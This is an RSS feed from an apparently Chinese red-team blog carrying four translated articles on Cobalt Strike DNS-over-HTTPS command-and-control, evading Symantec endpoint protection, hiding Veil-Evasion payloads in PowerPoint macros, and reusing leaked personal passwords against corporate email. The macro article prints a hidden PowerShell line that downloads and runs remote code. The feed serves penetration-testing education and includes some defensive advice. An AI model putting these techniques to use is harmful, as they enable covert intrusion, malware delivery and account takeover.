<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>红队技术 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/</link>
        <description>Recent content in 红队技术 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 02 Aug 2025 19:21:02 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>在Cobalt Strike中利用DNS over HTTPS实现隐蔽命令控制</title>
        <link>http://localhost:1313/p/%E5%9C%A8cobalt-strike%E4%B8%AD%E5%88%A9%E7%94%A8dns-over-https%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%94%BD%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/</link>
        <pubDate>Sat, 02 Aug 2025 19:21:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9C%A8cobalt-strike%E4%B8%AD%E5%88%A9%E7%94%A8dns-over-https%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%94%BD%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/</guid>
        <description>&lt;h1 id=&#34;dns-over-https-for-cobalt-strike&#34;&gt;DNS Over HTTPS for Cobalt Strike
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;近年来，红队行动中C2基础设施的搭建变得越来越困难。这对安全社区来说是件好事，因为这意味着厂商和专业从业者已经从过去成功的技术中吸取教训，并在网络中实施了有效的缓解措施。&lt;/p&gt;
&lt;p&gt;DNS over HTTPS（DoH）是一个未被充分重视的命令控制通道。本文将展示如何在Cobalt Strike中使用DoH，这种方式无需第三方账户或基础设施设置，通过有效的SSL证书加密流量，并将通信发送到信誉良好的域名。&lt;/p&gt;
&lt;h2 id=&#34;现有技术&#34;&gt;现有技术
&lt;/h2&gt;&lt;p&gt;攻击者和攻防安全专业人员使用不同的重定向器实现已有一段时间。最早使用的重定向器是配置了各种转发规则的简单Apache和Nginx服务器。&lt;/p&gt;
&lt;p&gt;重定向器不仅能增强基础设施的弹性，还能绕过依赖域名分类的防御措施。例如，当内容分发网络（CDN）对开发者更易获取后，攻击者就从传统重定向器转向这些平台，因为它们通常提供有效域名甚至SSL证书，减少了攻击者的工作量。&lt;/p&gt;
&lt;p&gt;后来出现的&amp;quot;域名伪装&amp;quot;技术被许多测试者大量使用。但最近CDN提供商开始打击这种行为。许多网站完全禁止域名伪装或主动搜索使用该技术的人。特别是微软，曾在行动中直接关闭Azure订阅。&lt;/p&gt;
&lt;h2 id=&#34;dns-over-https&#34;&gt;DNS over HTTPS
&lt;/h2&gt;&lt;p&gt;传统DNS信标相对容易被检测。我从未在行动中使用过Cobalt Strike的DNS监听器，仅限于之前描述的HTTPS监听器和重定向器。&lt;/p&gt;
&lt;p&gt;通过DoH实现的Beacon为我们提供了信誉良好的域名和有效的SSL证书，无需账户或重定向器配置。这进一步减少了操作员的设置时间，并消除了账户被关闭的风险。&lt;/p&gt;
&lt;h2 id=&#34;今日主题cobalt-strike中的dns-over-https&#34;&gt;今日主题：Cobalt Strike中的DNS over HTTPS
&lt;/h2&gt;&lt;p&gt;Austin Hudson首次在Twitter上向我介绍了DoH的使用。他过去一年的推文详细记录了实现这一功能的进展，并最终开发出开源工具TitanLdr。这个Cobalt Strike用户定义反射加载器（UDRL）通过钩取Beacon的导入地址表（IAT），将负责传统DNS查询的API调用（DNSQuery_A）替换为向dns.google（8.8.8.8和8.8.4.4）发送DoH请求的函数。&lt;/p&gt;
&lt;p&gt;仅这一点就是极佳的能力，但TitanLdr的DNSQuery_A钩子具有足够通用性，可与许多不同的DoH服务器配合使用！我已测试以下域名并确认它们可作为即插即用的替代方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dns.quad9.net&lt;/li&gt;
&lt;li&gt;mozilla.cloudflare-dns.com&lt;/li&gt;
&lt;li&gt;cloudflare-dns.com&lt;/li&gt;
&lt;li&gt;doh.opendns.com&lt;/li&gt;
&lt;li&gt;ordns.he.net&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用titanldr&#34;&gt;使用TitanLdr
&lt;/h2&gt;&lt;p&gt;TitanLdr是将此功能集成到Cobalt Strike的关键。原始版本的TitanLdr可通过单一DNS提供商进行HTTPS通信：https://github.com/secidiot/TitanLdr。您可以在hooks目录下的DnsQuery_A.c文件第111行更改DNS服务器。&lt;/p&gt;
&lt;p&gt;我还fork了TitanLdr以支持指定多个DoH服务器。每次回调时，Beacon会从硬编码列表中随机选择一个。如需使用多个DoH服务器，可从https://github.com/kyleavery/TitanLdr下载我的fork版本。hooks目录下DnsQuery_A.c文件的第116行可修改服务器列表。&lt;/p&gt;
&lt;p&gt;下载后需要构建程序，这需要安装NASM和MinGW的Linux主机。安装这些程序后，运行make命令创建必要文件。&lt;/p&gt;
&lt;p&gt;将Titan.cna Aggressor脚本导入Cobalt Strike后，即可使用DoH！像往常一样配置DNS监听器。Cobalt Strike文档对此监听器的配置有更详细介绍。&lt;/p&gt;
&lt;h2 id=&#34;dns-over-https的缺点&#34;&gt;DNS over HTTPS的缺点
&lt;/h2&gt;&lt;p&gt;虽然DoH信标相比传统HTTPS信标有优势，但也存在明显缺点：&lt;/p&gt;
&lt;p&gt;首先，传输相同信息需要更多数据包。DNS TXT记录最多只能包含255个字符，意味着每个数据包只能发送少量数据。&lt;/p&gt;
&lt;p&gt;其次，我们对可用服务器的路径或域名没有控制权。环境或设备拒绝向流行或已知DoH服务器发送443/TCP出站流量，比阻止Microsoft的*.azurewebsites.net或Cloudflare的*.workers.dev似乎更容易。可以通过使用更冷门的DoH服务器或自行构建并随时间推移进行分类来解决此问题，具体取决于环境配置。&lt;/p&gt;
&lt;h2 id=&#34;潜在检测方法&#34;&gt;潜在检测方法
&lt;/h2&gt;&lt;p&gt;当前检测技术在检测DNS over HTTPS方面可能存在漏洞：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对恶意HTTPS流量的检测通常利用域名信誉，对DoH可能无效，因为使用的域名信誉良好&lt;/li&gt;
&lt;li&gt;针对恶意DNS流量的检测通常监控大量DNS请求，对DoH可能无效，因为流量不再使用DNS协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;传统DNS监控与SSL检查相结合可能是潜在解决方案，但我目前不知道有任何工具或产品这样做。&lt;/p&gt;
&lt;p&gt;我认为防御此攻击的主要方法是阻止向组织未使用的已知DoH服务器发送443/TCP出站流量。我遇到的大多数网络仍使用传统DNS，通常作为Active Directory环境一部分运行本地DNS服务器。这种情况下，无需允许向dns.google、cloudflare-dns.com或本文提到的其他服务器发送HTTPS流量。&lt;/p&gt;
&lt;h2 id=&#34;结束语&#34;&gt;结束语
&lt;/h2&gt;&lt;p&gt;绝对有更多DNS over HTTPS服务器可用于此配置。此外，用户可以设置自己的DoH服务器，甚至可能位于CDN或其他云服务后面，以引入此技术的变体。&lt;/p&gt;
&lt;p&gt;TitanLdr仅限于Cobalt Strike，但DoH实现可以移植到任何其他C2框架。这种方法并非在所有情况下都是最佳选择，但它是我希望您能利用的工具箱中的另一个工具。如有任何问题或意见，请通过Twitter @kyleavery_与我联系。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Cobalt Strike与赛门铁克攻防实战：绕过端点防护的技术剖析</title>
        <link>http://localhost:1313/p/cobalt-strike%E4%B8%8E%E8%B5%9B%E9%97%A8%E9%93%81%E5%85%8B%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E7%AB%AF%E7%82%B9%E9%98%B2%E6%8A%A4%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 14:13:50 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cobalt-strike%E4%B8%8E%E8%B5%9B%E9%97%A8%E9%93%81%E5%85%8B%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E7%AB%AF%E7%82%B9%E9%98%B2%E6%8A%A4%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;c2基础设施构建&#34;&gt;C2基础设施构建
&lt;/h3&gt;&lt;p&gt;红队测试中，Cobalt Strike因其团队协作特性成为理想攻击平台。通过Digital Ocean虚拟机搭建包含以下要素的基础设施：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定制域名系统&lt;/li&gt;
&lt;li&gt;成熟域名仿冒亚马逊流量&lt;/li&gt;
&lt;li&gt;支持DNS/HTTP/HTTPS多通道&lt;/li&gt;
&lt;li&gt;使用自动化脚本生成威胁模拟配置文件（&lt;a class=&#34;link&#34; href=&#34;https://github.com/killswitch-GUI/CobaltStrike-ToolKit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;HTTPsC2DoneRight.sh&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;赛门铁克防护机制分析&#34;&gt;赛门铁克防护机制分析
&lt;/h3&gt;&lt;p&gt;测试环境采用最新版赛门铁克端点防护，主要防御层包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基于主机的入侵防御系统(HIPS)&lt;/li&gt;
&lt;li&gt;磁盘可执行文件签名检测&lt;/li&gt;
&lt;li&gt;进程创建管道中的ACT shim检测&lt;/li&gt;
&lt;li&gt;内存shellcode检测&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;载荷测试方案设计&#34;&gt;载荷测试方案设计
&lt;/h3&gt;&lt;p&gt;为规避检测设计三种测试场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;基础HTTP监听&lt;/strong&gt;：无定制配置的80端口监听&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;亚马逊流量伪装&lt;/strong&gt;：使用自动化脚本生成的标准配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定制化伪装&lt;/strong&gt;：修改关键参数的亚马逊配置&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;关键发现&#34;&gt;关键发现
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;32位载荷&lt;/strong&gt;：全部触发IPS警报并被阻断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;64位载荷&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;基础HTTP配置成功建立会话&lt;/li&gt;
&lt;li&gt;标准亚马逊配置在第二阶段GET请求时被TCP重置（无用户告警）&lt;/li&gt;
&lt;li&gt;修改数字参数的定制配置成功绕过（GET请求中&lt;code&gt;167-3294888-0262949&lt;/code&gt;改为全8）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术结论&#34;&gt;技术结论
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;64位内存注入shellcode仍具高成功率&lt;/li&gt;
&lt;li&gt;HIPS未检测第二阶段shellcode传递&lt;/li&gt;
&lt;li&gt;公开的威胁模拟技术易被特定签名阻断&lt;/li&gt;
&lt;li&gt;防御系统静默拦截会导致&amp;quot;假阴性&amp;quot;风险&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;红队最佳实践&#34;&gt;红队最佳实践
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;避免直接使用公开脚本模板&lt;/li&gt;
&lt;li&gt;必须自定义关键流量参数（Host头/Cookie值等）&lt;/li&gt;
&lt;li&gt;需验证所有攻击组件在目标环境的有效性&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;完整技术细节可参考作者培训课程：《企业攻击模拟与C2植入开发》&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>利用Veil-Evasion绕过杀毒软件检测的C2通信技术</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 02 Aug 2025 06:38:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;点击启用内容---绕过杀毒检测的c2通信技术&#34;&gt;点击启用内容 - 绕过杀毒检测的C2通信技术
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：本文所述技术可能已过时，但仍可作为学习现代工具技术演进的参考案例。&lt;/p&gt;
&lt;p&gt;在BHIS，绕过杀毒扫描已成为我们的&amp;quot;办公室运动&amp;quot;。在进行C2测试时，我们会从内网主机建立到C2服务器的反向连接，通过多种数据传递方式来测试防御系统的检测能力。我们的成功率很高（通常能成功外传数据），主要原因是恶意流量的识别极其困难——攻击者可以通过混淆技术使流量逃过杀毒软件和安全设备的检测。&lt;/p&gt;
&lt;h2 id=&#34;技术实现细节&#34;&gt;技术实现细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;监听器配置&lt;/strong&gt;&lt;br&gt;
在C2服务器设置443端口的反向TCP监听（选择443因其通常允许出站）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;载荷生成&lt;/strong&gt;&lt;br&gt;
使用Veil-Evasion工具生成混淆的PowerShell脚本载荷，该工具只需输入目标地址/端口及载荷类型即可自动生成代码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;宏安全处理&lt;/strong&gt;&lt;br&gt;
原始生成的2300字符单行脚本会触发VB编辑器报错。通过&lt;code&gt;macro_safe.py&lt;/code&gt;脚本将长代码分割为VB可处理的片段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# macro_safe.py处理示例&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将长命令拆分为多行连接字符串&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -nop -w hidden -c &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;IEX ((new-object net.webclient).&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;downloadstring(&amp;#39;http://192.168.1.1/a&amp;#39;))&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PPT宏植入&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将文档另存为&lt;code&gt;.pps&lt;/code&gt;（97-2003格式）避免&amp;quot;m&amp;quot;扩展名引起怀疑&lt;/li&gt;
&lt;li&gt;通过&amp;quot;开发工具&amp;quot;选项卡插入VB模块&lt;/li&gt;
&lt;li&gt;使用&amp;quot;鼠标点击&amp;quot;动作触发宏执行（覆盖整个首幻灯片的文本框）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安全绕过实证&#34;&gt;安全绕过实证
&lt;/h2&gt;&lt;p&gt;测试扫描结果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gmail扫描器 ❌ 未检测&lt;/li&gt;
&lt;li&gt;Windows Defender ❌ 未检测&lt;/li&gt;
&lt;li&gt;McAfee ❌ 未检测&lt;/li&gt;
&lt;li&gt;Symantec ❌ 未检测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;唯一防护是PowerPoint的主动内容警告，但用户往往因&amp;quot;错误消息疲劳&amp;quot;而忽略。这种技术揭示了单纯依赖杀毒软件的黑名单机制和用户教育的重要性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;如果必须让用户做安全决策，就必须持续教育他们认识潜在危险。&amp;rdquo; —— BHIS团队&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E5%A4%8D%E9%97%AE%E9%A2%98%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E6%97%A0%E9%9C%80%E6%8E%A5%E5%85%A5%E7%9B%AE%E6%A0%87%E7%BD%91%E7%BB%9C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</link>
        <pubDate>Fri, 01 Aug 2025 21:37:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E5%A4%8D%E9%97%AE%E9%A2%98%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E6%97%A0%E9%9C%80%E6%8E%A5%E5%85%A5%E7%9B%AE%E6%A0%87%E7%BD%91%E7%BB%9C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</guid>
        <description>&lt;h1 id=&#34;利用个人账户密码重复问题获取域凭证无需接入目标网络的攻击方法第一部分&#34;&gt;利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者：Beau Bullock&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在本系列文章中，我将详细介绍无需接入目标组织网络即可获取域用户凭证的多种方法。第一部分重点探讨如何利用员工在个人账户重复使用企业密码的行为；第二部分将介绍通过发现目标组织的用户名架构，并对外部服务（如Outlook Web Access门户）实施密码喷洒攻击的更复杂技术。&lt;/p&gt;
&lt;h2 id=&#34;本文不涉及便利贴密码问题&#34;&gt;本文不涉及便利贴密码问题
&lt;/h2&gt;&lt;h3 id=&#34;个人账户的凭证重用现象&#34;&gt;个人账户的凭证重用现象
&lt;/h3&gt;&lt;p&gt;用户在多个网络服务中重复使用相同密码是普遍存在的安全隐患。当某个网站遭到入侵时，若员工在个人账户和企业账户使用相同密码，攻击者获取个人凭证后即可间接获得企业账户访问权限。&lt;/p&gt;
&lt;h3 id=&#34;突破传统分析思路&#34;&gt;突破传统分析思路
&lt;/h3&gt;&lt;p&gt;常规的凭证泄露分析通常仅关注目标组织拥有的域名。更有效的方法是尝试定位企业员工在第三方服务中泄露的个人账户。当目标组织本身提供个人账户服务时（如Google员工可能拥有gmail.com账户），这种关联会变得更容易。&lt;/p&gt;
&lt;h3 id=&#34;实战案例从5万条泄露数据中定位员工凭证&#34;&gt;实战案例：从5万条泄露数据中定位员工凭证
&lt;/h3&gt;&lt;p&gt;在一次测试中，作者通过Pwnedlist.com发现目标组织的客户域名存在超过50,000个近期泄露账户。通过与组织沟通，确认员工可能使用这些&amp;quot;技术上的个人账户&amp;quot;。&lt;/p&gt;
&lt;p&gt;关键步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用Pipl.com搜索引擎关联泄露邮箱与员工身份&lt;/li&gt;
&lt;li&gt;通过Burp Suite Intruder批量提交50,000个邮箱&lt;/li&gt;
&lt;li&gt;筛选包含目标公司名称的&amp;quot;Career&amp;quot;字段&lt;/li&gt;
&lt;li&gt;最终定位到252个疑似员工个人账户&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;凭证转换与验证&#34;&gt;凭证转换与验证
&lt;/h3&gt;&lt;p&gt;通过侦察获取企业邮箱命名规则（如firstname.lastname@格式）后：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将个人账户信息转换为企业邮箱格式&lt;/li&gt;
&lt;li&gt;使用泄露的密码尝试登录企业外部门户（如OWA）&lt;/li&gt;
&lt;li&gt;成功访问重复使用密码的员工企业邮箱&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;攻击流程总结&#34;&gt;攻击流程总结
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;通过Pwnedlist等平台收集目标组织关联的个人账户泄露凭证&lt;/li&gt;
&lt;li&gt;使用Pipl验证账户持有人的雇主信息&lt;/li&gt;
&lt;li&gt;根据企业邮箱规则转换个人账户信息&lt;/li&gt;
&lt;li&gt;尝试凭证重用攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h2&gt;&lt;p&gt;推行密码管理工具，杜绝员工在多平台重复使用密码的行为。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;下篇将详细介绍如何通过发现用户名架构实施密码喷洒攻击。&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/password-spraying-outlook-web-access/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;点击此处阅读第二部分&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
